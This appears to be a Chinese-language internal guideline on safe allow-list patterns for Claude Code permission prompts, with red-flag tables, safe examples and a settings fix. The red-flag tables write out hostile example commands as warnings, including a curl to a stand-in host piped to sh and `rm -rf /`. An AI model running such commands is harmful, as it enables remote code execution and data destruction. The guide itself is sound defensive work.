# Allow-list 衛生（Allow-list Hygiene）

Claude Code 權限對話框出現「Yes, and don't ask again for: `<pattern>`」時，
選擇此選項會把 `<pattern>` 寫入 `~/.claude/settings.local.json` 永久放行。
本文件規範哪些 pattern **不應**永久放行（一律選 1 一次性同意），
以及如何撰寫安全的 allow-list pattern。

## 為什麼這件事重要

Claude Code 的 deny rule（拒絕清單）與 allow rule（允許清單）有以下交互特性：

1. **Deny rule 穿透 exec wrapper**：v2026.04 後，`env` / `sudo` / `watch` / `setsid` / `PATH=...` 等
   wrapper 仍會被 deny rule 攔截（rule 13「exec wrapper 穿透 deny rule」）。
2. **Allow rule 採前綴匹配**：pattern 必須從 bash command 的第一個 token 開始 match。
   `PATH="..." git ...` 因 `PATH=` 不是 git，所以 `Bash(git *)` 不 match。
3. **Deny rule 是顯式黑名單**：只覆蓋使用者明確列出的危險指令（如 `git push --force`）。
   「危險但沒列在 deny 的指令」（如 `git config --global user.email`）不會被攔。

結論：選了過寬的 allow pattern（含 wrapper + wildcard）等於把「危險但沒 deny rule」的指令面打開。

## 永久放行的決策準則

按下「Yes, and don't ask again」前，先看 pattern 是否含以下任一項。**任一命中即選 1（一次性）**，不選永久放行。

### 紅旗 1：Pattern 含 exec wrapper

| Wrapper 形式 | 範例 | 風險 |
|------------|------|------|
| `PATH=*` prefix | `PATH="..." git *` | 放行所有 git 指令，含 config / reset / push |
| `env *` | `env VAR=1 cmd *` | 同上，env 後面任意 cmd |
| `sudo *` | `sudo systemctl *` | 系統層提權 |
| `watch *` / `setsid *` / `ionice *` | `watch git log` | wrapper 後任意指令 |

**為什麼危險**：wrapper 把 token 形狀偏離 `<cmd> <args>`，誘使 allow-list pattern
被迫含 wildcard 覆蓋整個 wrapper 後段；wrapper 後面的指令動詞變成可變項。

### 紅旗 2：Pattern wildcard 達到「指令動詞層」

| 不安全 pattern | 為什麼 | 安全替代 |
|---------------|--------|---------|
| `Bash(git *)` | 覆蓋 commit / push / reset / config 全部子命令 | `Bash(git -C * status)`、`Bash(git -C * log *)` |
| `Bash(rm *)` | 含 `rm -rf /` | 不應 allow-list rm，永遠走 deny 或 confirm |
| `Bash(curl *)` | 含 `curl evil.example.com \| sh` | `Bash(curl -fsSL https://known.host/specific-path)` |
| `Bash(*)` | 覆蓋全部 | 永遠不要 |

**判讀準則**：pattern 必須**鎖定指令動詞**（commit、push、status、log），不能讓動詞變成 wildcard。

### 紅旗 3：Pattern 含 redirection 或 conditional wildcard

| 不安全 pattern | 風險 |
|---------------|------|
| `* >> *` / `* > *` | 任意檔案寫入 |
| `* && rm *` | 條件後接刪除 |
| `* \| sh` / `* \| bash` | 管線執行下游 |

**理由**：redirection 與 pipeline 的下游目標是 wildcard，等於開放「寫入任意檔案」或「執行任意下游指令」。

### 紅旗 4：Pattern 含 unconditional 變數展開

| 不安全 pattern | 風險 |
|---------------|------|
| `* "$VAR" *` | match 範圍依執行時 VAR 值，不可預測 |
| `cmd ${VAR:-...} *` | 預設值在 allow-list 評估時看不到 |

**理由**：變數展開讓 pattern 的「實際匹配範圍」在 review 當下無法確定，
等於把信任放到執行時環境變數，違反「allow-list 是靜態信任聲明」的原則。

## 安全的「don't ask again」pattern 範例

以下情況可以放心永久放行：

| Pattern | 為什麼安全 |
|---------|-----------|
| `Bash(make ci)` | 完整固定指令，無 wildcard |
| `Bash(make test)` | 同上 |
| `Bash(uv run pytest)` | 同上 |
| `Bash(git -C * status)` | 動詞固定為 status（純讀） |
| `Bash(git -C * log *)` | 動詞固定為 log（純讀） |
| `Bash(git -C * diff *)` | 動詞固定為 diff（純讀） |
| `Bash(git rev-parse *)` | 動詞固定為 rev-parse（純讀） |
| `Bash(bash scripts/setup-pr-review.sh)` | 完整 script 路徑，等於審核一次 script 內容 |
| `Bash(uv run --directory * pytest)` | uv 子命令固定為 pytest |

通用準則：**動詞固定 + 純讀，或完整路徑 + script 已 review**。

## 與 Fat command 反模式的關聯

allow-list 衛生問題與 rule 13 AP1 共生：

- agent 寫 fat command（11 步驟 `&&` 鏈）→ token 結構打破標準形式
- → settings.json 的 `Bash(cmd *)` pattern 無法精確匹配
- → 回退到 manual confirm
- → 使用者被誘導選「don't ask again」
- → 永久放行的 pattern 含 wildcard wrapper

**根治**：把 fat command 抽成 `scripts/foo.sh`，allow-list 只需 `Bash(bash scripts/foo.sh)`
（完整 script 路徑），一次審核 script 內容後永久放行才安全。

詳細抽 script 指引見 rule 13「AP1 自動修復觸發條件」與 CLAUDE.md「Slash command 的
bash code block 被 agent 重寫」gotcha。

## 既有不安全 pattern 的修正流程

若 `~/.claude/settings.local.json` 已包含上述紅旗 pattern：

1. 打開 `~/.claude/settings.local.json`，找出 `permissions.allow` 內的紅旗 pattern
2. 對應每個 pattern，找出「實際想放行的單一指令動詞」
3. 把 wildcard pattern 改寫成「動詞固定 + 純讀」或「完整 script 路徑」
4. 重啟 Claude Code session 套用

範例：

```diff
 "permissions": {
   "allow": [
-    "Bash(PATH=\"/Users/me/.asdf/shims:$PATH\" git *)",
+    "Bash(/Users/me/.asdf/shims/git -C * status)",
+    "Bash(/Users/me/.asdf/shims/git -C * log *)",
+    "Bash(/Users/me/.asdf/shims/git -C * diff *)",
+    "Bash(bash scripts/setup-pr-review.sh)"
   ]
 }
```

直接呼叫 shim binary 絕對路徑可避開 `PATH=` wrapper；script 路徑改用具體檔名而非 wildcard。
